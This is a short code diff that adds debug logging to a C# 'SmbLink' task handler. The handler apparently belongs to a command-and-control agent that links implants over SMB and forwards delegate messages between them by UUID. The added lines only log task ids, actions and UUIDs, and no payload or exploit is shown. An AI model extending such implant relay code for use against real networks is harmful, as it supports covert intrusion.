@@ -22,9 +22,11 @@ namespace Workflow
 
         public async Task Execute(ServerJob job)
         {
+            DebugLog.Log($"Executing {Name} [{job.task.id}]");
             SmbLinkArgs args = JsonSerializer.Deserialize<SmbLinkArgs>(job.task.parameters);
             if (args is null)
             {
+                DebugLog.Log($"{Name} invalid parameters [{job.task.id}]");
                 messageManager.AddTaskResponse(new TaskResponse()
                 {
                     task_id = job.task.id,
@@ -34,6 +36,7 @@ namespace Workflow
                 });
                 return;
             }
+            DebugLog.Log($"{Name} action={args.action} [{job.task.id}]");
             switch (args.action)
             {
                 case "link":
@@ -105,6 +108,7 @@ namespace Workflow
 
         public async Task ForwardDelegate(DelegateMessage dm)
         {
+            DebugLog.Log($"{Name} ForwardDelegate uuid={dm.uuid}");
             if (this.forwarders.Any(a => a.Value.linked_agent_id == dm.uuid || a.Value.linked_agent_id == dm.new_uuid))
             {
                 var fwdr = this.forwarders.Where(a => a.Value.linked_agent_id == dm.uuid || a.Value.linked_agent_id == dm.new_uuid).First();
